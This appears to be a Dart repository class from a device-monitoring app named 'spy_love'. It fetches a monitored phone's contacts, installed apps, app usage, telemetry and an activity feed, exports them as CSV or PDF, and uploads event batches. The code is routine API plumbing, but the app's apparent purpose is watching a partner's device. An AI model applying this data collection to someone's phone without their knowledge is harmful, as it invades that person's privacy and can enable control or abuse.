import 'dart:typed_data';
import 'package:dio/dio.dart';
import 'package:one_request/one_request.dart' hide Either, Left, Right, ResponseType;
import 'package:spy_love/core/config/app_config.dart';
import 'package:spy_love/core/constants/api_constants.dart';
import 'package:spy_love/core/network/api_service.dart';
import 'package:spy_love/core/network/http_method.dart';
import 'package:spy_love/core/storage/token_storage.dart';
import 'package:spy_love/core/types/either.dart';
import 'package:spy_love/features/devices/models/device_event_model.dart';
import 'package:spy_love/features/devices/models/app_usage_model.dart';
import 'package:spy_love/features/devices/models/telemetry_model.dart';
import 'package:spy_love/features/devices/models/activity_item.dart';

class EventRepository {
  EventRepository(this._api, this._tokens);

  final ApiService _api;
  final TokenStorage _tokens;

  Future<Either<List<DeviceEventModel>, String>> listEvents({
    required String deviceId,
    String? eventPrefix,
    int page = 1,
    int pageSize = 20,
    bool loader = true,
  }) async {
    final query = <String, dynamic>{
      'device_id': deviceId,
      'page': page,
      'page_size': pageSize,
    };
    if (eventPrefix != null && eventPrefix.isNotEmpty) {
      query['event_prefix'] = eventPrefix;
    }

    final result = await _api.send<Map<String, dynamic>>(
      url: ApiConstants.events,
      method: HttpMethod.get,
      queryParameters: query,
      loader: loader,
    );

    if (result.isLeft) {
      final data = result.left;
      final results = data['results'] as List<dynamic>? ?? const [];
      final events = results
          .map((e) => DeviceEventModel.fromJson(e as Map<String, dynamic>))
          .toList();
      return Left(events);
    }
    return Right(result.right);
  }

  Future<Either<List<DeviceEventModel>, String>> listAllEvents({
    required String deviceId,
    String? eventPrefix,
    int maxPages = 5,
    int pageSize = 100,

    /// Background / poll fetches must keep this false so the global overlay
    /// does not block the UI every few seconds.
    bool loader = false,
  }) async {
    final all = <DeviceEventModel>[];
    for (var page = 1; page <= maxPages; page++) {
      final result = await listEvents(
        deviceId: deviceId,
        eventPrefix: eventPrefix,
        page: page,
        pageSize: pageSize,
        loader: loader && page == 1,
      );
      if (result.isRight) return Right(result.right);

      final batch = result.left;
      all.addAll(batch);
      if (batch.length < pageSize) break;
    }
    return Left(all);
  }

  /// Returns the ingest payload on success (may include `paused` / `paused_until`).
  Future<Either<Map<String, dynamic>, String>> uploadBatch({
    required String deviceId,
    required List<Map<String, dynamic>> events,
  }) async {
    final result = await _api.send<Map<String, dynamic>>(
      url: ApiConstants.eventsBatch,
      method: HttpMethod.post,
      body: {'device_id': deviceId, 'events': events},
      loader: false,
      resultOverlay: false,
    );

    if (result.isLeft) return Left(result.left);
    return Right(result.right);
  }

  /// Latest address-book snapshot for a device via GET /events/contacts/latest/.
  /// Returns the raw snapshot map ({contacts, contact_count, ...}) on success,
  /// or null when none exists yet (404) / on error.
  Future<Map<String, dynamic>?> latestContacts({
    required String deviceId,
    bool loader = false,
  }) async {
    final result = await _api.send<Map<String, dynamic>>(
      url: ApiConstants.eventsContactsLatest,
      method: HttpMethod.get,
      queryParameters: {'device_id': deviceId},
      loader: loader,
      resultOverlay: false,
    );
    return result.isLeft ? result.left : null;
  }

  /// Latest installed-app inventory for a device via
  /// GET /events/app-inventory/latest/. Returns the raw snapshot map
  /// ({apps, app_count, include_system, ...}) or null when none/on error.
  Future<Map<String, dynamic>?> latestAppInventory({
    required String deviceId,
    bool loader = false,
  }) async {
    final result = await _api.send<Map<String, dynamic>>(
      url: ApiConstants.eventsAppInventoryLatest,
      method: HttpMethod.get,
      queryParameters: {'device_id': deviceId},
      loader: loader,
      resultOverlay: false,
    );
    return result.isLeft ? result.left : null;
  }

  /// GET /events/app-usage/latest/?device_id=
  Future<AppUsageSnapshot?> latestAppUsage({
    required String deviceId,
    bool loader = false,
  }) async {
    final result = await _api.send<Map<String, dynamic>>(
      url: ApiConstants.appUsageLatest,
      method: HttpMethod.get,
      queryParameters: {'device_id': deviceId},
      loader: loader,
      resultOverlay: false,
    );
    return result.isLeft ? AppUsageSnapshot.fromJson(result.left) : null;
  }

  /// GET /events/app-usage/?device_id=&from=&to=
  Future<Either<AppUsageSnapshot, String>> appUsageRange({
    required String deviceId,
    required DateTime from,
    required DateTime to,
    bool loader = false,
  }) async {
    final result = await _api.send<Map<String, dynamic>>(
      url: ApiConstants.appUsageRange,
      method: HttpMethod.get,
      queryParameters: {
        'device_id': deviceId,
        'from': from.toUtc().toIso8601String(),
        'to': to.toUtc().toIso8601String(),
      },
      loader: loader,
      resultOverlay: false,
    );
    if (result.isLeft) {
      return Left(AppUsageSnapshot.fromJson(result.left));
    }
    return Right(result.right);
  }

  /// GET /events/telemetry/latest/?device_id=
  Future<TelemetrySnapshot?> latestTelemetry({
    required String deviceId,
    bool loader = false,
  }) async {
    final result = await _api.send<Map<String, dynamic>>(
      url: ApiConstants.telemetryLatest,
      method: HttpMethod.get,
      queryParameters: {'device_id': deviceId},
      loader: loader,
      resultOverlay: false,
    );
    return result.isLeft ? TelemetrySnapshot.fromJson(result.left) : null;
  }

  /// GET /events/telemetry/?device_id=&limit= (1–200). Accepts either a
  /// paginated `{results:[]}` body or a bare list under `results`.
  Future<Either<List<TelemetrySnapshot>, String>> telemetryHistory({
    required String deviceId,
    int limit = 50,
    bool loader = false,
  }) async {
    final result = await _api.send<Map<String, dynamic>>(
      url: ApiConstants.telemetryHistory,
      method: HttpMethod.get,
      queryParameters: {
        'device_id': deviceId,
        'limit': limit.clamp(1, 200),
      },
      loader: loader,
      resultOverlay: false,
    );
    if (result.isLeft) {
      final raw = result.left['results'] as List<dynamic>? ?? const [];
      return Left([
        for (final e in raw)
          TelemetrySnapshot.fromJson(e as Map<String, dynamic>),
      ]);
    }
    return Right(result.right);
  }

  /// GET /events/export/?device_id=&from=&to=&feeds=&export_format=
  /// Returns raw bytes (CSV stream or PDF). Uses Dio directly so binary
  /// responses are not forced through the JSON overlay path.
  Future<Either<Uint8List, String>> export({
    required String deviceId,
    required DateTime from,
    required DateTime to,
    required List<String> feeds,
    required String exportFormat, // csv | pdf
  }) async {
    try {
      final token = await _tokens.getAccessToken();
      final response = await OneRequest.client.get<List<int>>(
        '${AppConfig.apiBaseUrl.replaceAll(RegExp(r"/+$"), "")}'
        '${ApiConstants.eventsExport}',
        queryParameters: {
          'device_id': deviceId,
          'from': from.toUtc().toIso8601String(),
          'to': to.toUtc().toIso8601String(),
          'feeds': feeds.join(','),
          'export_format': exportFormat,
        },
        options: Options(
          responseType: ResponseType.bytes,
          headers: {
            if (token != null && token.isNotEmpty)
              'Authorization': 'Bearer $token',
          },
          validateStatus: (s) => s != null && s < 500,
        ),
      );
      final status = response.statusCode ?? 0;
      if (status == 403) {
        return const Right('You do not have permission to export this device');
      }
      if (status >= 400 || response.data == null) {
        return Right('Export failed (HTTP $status)');
      }
      return Left(Uint8List.fromList(response.data!));
    } on DioException catch (e) {
      return Right(e.message ?? 'Export failed');
    } catch (e) {
      return Right(e.toString());
    }
  }

  /// GET /events/activity/?device_id=&from=&to=&types=&cursor=&limit=
  /// Merged reverse-chronological feed (events + alerts) for one device.
  /// Uses Dio directly so the HTTP status is visible: 403 -> access denied
  /// (VIEWER / consent off), 404 -> endpoint not deployed (caller falls back to
  /// a client-side merge). Background/poll fetches never trigger the overlay.
  Future<ActivityFetchOutcome> activity({
    required String deviceId,
    DateTime? from,
    DateTime? to,
    List<String> types = const [],
    String? cursor,
    int limit = 50,
  }) async {
    try {
      final token = await _tokens.getAccessToken();
      final response = await OneRequest.client.get<Map<String, dynamic>>(
        '${AppConfig.apiBaseUrl.replaceAll(RegExp(r"/+$"), "")}'
        '${ApiConstants.eventsActivity}',
        queryParameters: {
          'device_id': deviceId,
          'limit': limit,
          if (from != null) 'from': from.toUtc().toIso8601String(),
          if (to != null) 'to': to.toUtc().toIso8601String(),
          if (types.isNotEmpty) 'types': types.join(','),
          if (cursor != null && cursor.isNotEmpty) 'cursor': cursor,
        },
        options: Options(
          headers: {
            if (token != null && token.isNotEmpty)
              'Authorization': 'Bearer $token',
          },
          validateStatus: (s) => s != null && s < 500,
        ),
      );
      final status = response.statusCode ?? 0;
      if (status == 403) return ActivityFetchOutcome.denied();
      if (status == 404) return ActivityFetchOutcome.notAvailable();
      if (status >= 400 || response.data == null) {
        return ActivityFetchOutcome.failed('Activity feed failed (HTTP $status)');
      }
      final data = response.data!;
      final raw = data['results'] as List<dynamic>? ?? const [];
      final items = [
        for (final e in raw)
          ActivityItem.fromJson((e as Map).cast<String, dynamic>()),
      ];
      final next = data['next']?.toString();
      return ActivityFetchOutcome.loaded(
        ActivityPage(items: items, nextCursor: next),
      );
    } on DioException catch (e) {
      return ActivityFetchOutcome.failed(e.message ?? 'Activity feed failed');
    } catch (e) {
      return ActivityFetchOutcome.failed(e.toString());
    }
  }
}
